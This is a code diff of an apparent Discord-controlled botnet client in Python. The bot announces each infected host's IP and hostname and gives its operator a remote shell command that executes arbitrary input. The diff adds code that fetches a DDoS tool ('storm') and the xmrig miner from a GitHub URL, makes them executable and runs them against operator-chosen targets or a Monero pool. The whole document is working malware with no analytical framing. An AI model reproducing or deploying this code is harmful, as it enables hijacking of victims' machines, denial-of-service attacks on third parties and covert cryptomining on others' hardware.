@@ -1,5 +1,5 @@
 from discord.ext import commands
-import requests, discord, psutil, socket, sys, os
+import requests, discord, urllib, psutil, socket, sys, os
 
 token = 'MToken.mnt.discord' # Token
 channel_id = 111111111111111111  # Channel ID
@@ -24,7 +24,7 @@ async def on_ready():
     await channel.send(f"``[+] {ip}@{hostname}: Session opened``")
     
 
-# ----- Bot Commands ----- #
+# ----- Commands ----- #
 
 # sessions
 @bot.command()
@@ -32,7 +32,7 @@ async def sessions(ctx):
     await ctx.send(f"``[*] {ip}@{hostname}``")
     
 # shell
-@bot.command()
+@bot.command(name=f"shell.{hostname}@{ip}")
 async def shell(ctx, *args):
     arguments = ' '.join(args)
     stream = os.popen(arguments)
@@ -51,19 +51,22 @@ async def check(ctx):
     else:
         await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")
     
+    if "storm" in (i.name() for i in psutil.process_iter()):
+        await ctx.send(f"``[+] {ip}@{hostname}: DDoS running``")
+    else:
+        await ctx.send(f"``[-] {ip}@{hostname}: DDoS not running``")
+    
 # ddos
 @bot.command()
 async def ddos(ctx, ddosarg):
-    ddosip = ''.join(ddosarg)
-    os.popen(f"chmod +x storm & ./storm -d {ddosip}")
-    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started to {ddosip}``")
+    if not os.path.exists("storm"):
+        url = "https://github.com/rxu7s/Public/raw/main/storm"
+        r = requests.get(url, allow_redirects=True)
+        open("storm", 'wb').write(r.content)
     
-# stop ddos
-@bot.command()
-async def stopddos(ctx):
-    if "storm" in (i.name() for i in psutil.process_iter()):
-        os.popen("pkill storm")
-        await ctx.send(f"``[-] {ip}@{hostname}: DDoS stoped``")
+    ddosip = ''.join(ddosarg)
+    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
+    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started to {ddosip}``")
     
 # stop ddos
 @bot.command()
@@ -75,8 +78,13 @@ async def stopddos(ctx):
 # miner
 @bot.command()
 async def miner(ctx, walletArg):
+    if not os.path.exists("xmrig"):
+        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
+        r = requests.get(url, allow_redirects=True)
+        open("xmrig", 'wb').write(r.content)
+    
     wallet = ''.join(walletArg)
-    os.popen(f"./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
+    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
     await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
     
 # stop miner
